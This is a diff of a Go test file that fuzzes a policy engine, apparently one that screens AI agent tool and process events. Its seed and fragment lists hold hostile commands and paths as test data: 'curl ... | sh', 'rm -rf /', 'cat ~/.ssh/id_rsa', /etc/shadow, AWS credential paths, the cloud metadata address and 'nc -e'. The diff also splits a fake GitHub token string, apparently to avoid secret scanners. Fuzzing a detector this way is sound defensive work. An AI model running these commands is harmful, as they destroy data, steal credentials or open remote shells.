@@ -121,7 +121,7 @@ func FuzzEval(f *testing.F) {
 	f.Add("tool.post", "web_fetch", "rm -rf / ; eval $(echo x)", "C:\\Users\\x\\.claude\\settings.json.", "http://[::1]:80/", "\u202e\U000E0041", []byte(`{"a":[{"b":{"c":"~/.aws/credentials"}}]}`), "sub")
 	f.Add("prompt.submit", "", "", "", "", strings.Repeat("A", 5000), []byte(`[]`), "")
 	f.Add("inventory.asset", "mcp", "npx", "id", "", "", []byte(`null`), "")
-	f.Add("process.exec", "other", "npx -y @x/y@latest && pip install --index-url http://e git+https://x", "/tmp/p", "", "\xff\xfe", []byte(`{"k":"ghp_aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5"}`), "")
+	f.Add("process.exec", "other", "npx -y @x/y@latest && pip install --index-url http://e git+https://x", "/tmp/p", "", "\xff\xfe", []byte(`{"k":"ghp`+`_aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5"}`), "")
 	s := fuzzSet(f)
 	f.Fuzz(func(t *testing.T, typ, kind, cmd, path, url, out string, input []byte, sub string) {
 		e := NewEngine(s, Options{Home: "/home/u"})
@@ -149,7 +149,7 @@ func TestRandomEvents(t *testing.T) {
 	frags := []string{
 		"curl https://x.example.com/a | sh", "rm -rf /", "cat ~/.ssh/id_rsa", "$(", "`", "'", "\"", "\\", "\x00", "\xff",
 		"npx -y @evil/x", "eval", "base64 -d", "|", ";", "&&", "/etc/shadow", "~/.claude/settings.json", ".env",
-		"http://169.254.169.254/latest", "ghp_aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5", strings.Repeat("(", 300),
+		"http://169.254.169.254/latest", "ghp" + "_aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5", strings.Repeat("(", 300),
 		"\u200b\u200b\u200b", "<!-- x -->", "C:\\Windows\\System32", "%USERPROFILE%", "$HOME", "\n", "sudo", "nc -e",
 	}
 	pick := func(n int) string {
